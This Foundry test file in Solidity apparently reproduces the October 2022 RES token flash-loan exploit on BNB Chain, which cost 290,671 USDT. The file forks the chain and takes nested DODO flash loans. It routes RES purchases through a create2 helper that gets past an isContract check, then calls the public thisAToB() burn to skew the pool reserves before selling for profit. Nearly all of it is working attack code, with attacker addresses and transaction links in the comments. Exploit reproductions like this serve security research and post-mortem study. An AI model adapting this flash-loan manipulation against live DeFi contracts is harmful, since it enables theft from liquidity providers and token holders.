// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : 290,671 USDT
// Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6
// Attack Contract : https://bscscan.com/address/0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f
// Vulnerable Contract : https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21
// Attack Txs :
//    - https://bscscan.com/tx/0xe59fa48212c4ee716c03e648e04f0ca390f4a4fc921a890fded0e01afa4ba96d
//    - https://bscscan.com/tx/0xef19a4dfd69874d5efda3e38b5a19cae4e0b0bdc95769760bd85ede4d15609ac

// @Info
// Vulnerable Contract Code : https://www.bscscan.com/address/0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21#code#L683

// @Analysis
// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1578120337509662721
// Twitter Ancilia : https://x.com/AnciliaInc/status/1578119778446680064
// Article QuillAudits : https://quillaudits.medium.com/res-token-290k-flash-loan-exploit-quillaudits-9300657fff7b

interface IRES is IERC20 {
    function thisAToB() external;
}

contract ReceiveToken {
    constructor() {
        IRES RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
        IERC20 ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
        RES_TOKEN.approve(msg.sender, type(uint256).max);
        ALL_TOKEN.approve(msg.sender, type(uint256).max);
        selfdestruct(payable(msg.sender));
    }
}

contract ContractTest is Test {
    IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
    IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
    IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
    IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 constant USDT_RES_PAIR = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
    Uni_Pair_V2 constant USDT_ALL_PAIR = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
    address constant dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
    address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
    uint256 amount;
    uint256 amount2;
    address add;

    function setUp() public {
        vm.createSelectFork("bsc", 21_948_016);
        // Adding labels to improve stack traces' readability
        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
        vm.label(address(RES_TOKEN), "RES_TOKEN");
        vm.label(address(ALL_TOKEN), "ALL_TOKEN");
        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(USDT_RES_PAIR), "USDT_RES_PAIR");
        vm.label(address(USDT_ALL_PAIR), "USDT_ALL_PAIR");
    }

    function testExploit() public payable {
        emit log_named_decimal_uint(
            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
        // use mint WBNB to mock flashLoan
        (bool success,) = address(WBNB_TOKEN).call{value: 30_000 ether}("");
        require(success, "Mocked flashloan failed");
        _WBNBToUSDT();
        uint256 USDTBefore = USDT_TOKEN.balanceOf(address(this));
        emit log_named_decimal_uint(
            "[Start] exchange USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
        );
        amount = USDT_TOKEN.balanceOf(dodo);
        amount2 = USDT_TOKEN.balanceOf(dodo2);
        USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        RES_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        ALL_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        bytes memory bytecode = type(ReceiveToken).creationCode;
        address _add;
        assembly {
            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)
        }
        add = _add;
        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));

        uint256 USDTAfter = USDT_TOKEN.balanceOf(address(this));

        emit log_named_decimal_uint(
            "[End] USDT_RES_PAIR USDT balance after exploit", USDT_TOKEN.balanceOf(address(USDT_RES_PAIR)), 18
        );

        emit log_named_decimal_uint(
            "[End] USDT_ALL_PAIR USDT balance after exploit", USDT_TOKEN.balanceOf(address(USDT_ALL_PAIR)), 18
        );

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDTAfter - USDTBefore, 18);
    }

    function DPPFlashLoanCall(
        address, /*sender*/
        uint256, /*baseAmount*/
        uint256, /*quoteAmount*/
        bytes calldata /*data*/
    ) public {
        if (msg.sender == dodo2) {
            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));
            USDT_TOKEN.balanceOf(address(this));
            USDT_TOKEN.transfer(dodo2, amount2);
        } else {
            // get RES
            uint256 amountBuy = USDT_TOKEN.balanceOf(address(this)) / 4;
            buyRES(amountBuy);
            buyRES(amountBuy);
            buyRES(amountBuy);
            buyRES(amountBuy);
            // Burn RES in LP
            RES_TOKEN.thisAToB();
            // Sell RES , ALL
            sellRES();
            sellALL();
            USDT_TOKEN.balanceOf(address(this));
            USDT_TOKEN.transfer(address(dodo), amount);
        }
    }

    function _WBNBToUSDT() internal {
        WBNB_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB_TOKEN);
        path[1] = address(USDT_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function buyRES(uint256 amountBuy) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT_TOKEN);
        path[1] = address(RES_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountBuy,
            0,
            path,
            // pass isContract(), the exploiter use EOA address in another contract, I guess he approved the contract in advance
            add,
            block.timestamp
        );
    }

    function sellRES() internal {
        (uint256 reserve0, uint256 reserve1,) = USDT_RES_PAIR.getReserves();
        RES_TOKEN.transferFrom(add, address(USDT_RES_PAIR), RES_TOKEN.balanceOf(add));
        uint256 amountin = RES_TOKEN.balanceOf(address(USDT_RES_PAIR)) - reserve1;
        uint256 amountout = amountin * 9975 * reserve0 / (reserve1 * 10_000 + amountin * 9975);
        USDT_RES_PAIR.swap(amountout, 0, address(this), "");
    }

    function sellALL() internal {
        (uint256 reserve0, uint256 reserve1,) = USDT_ALL_PAIR.getReserves();
        ALL_TOKEN.transferFrom(add, address(USDT_ALL_PAIR), ALL_TOKEN.balanceOf(add));
        uint256 amountin = ALL_TOKEN.balanceOf(address(USDT_ALL_PAIR)) - reserve0;
        uint256 amountout = amountin * 9975 * reserve1 / (reserve0 * 10_000 + amountin * 9975);
        USDT_ALL_PAIR.swap(0, amountout, address(this), "");
    }

    receive() external payable {}
}
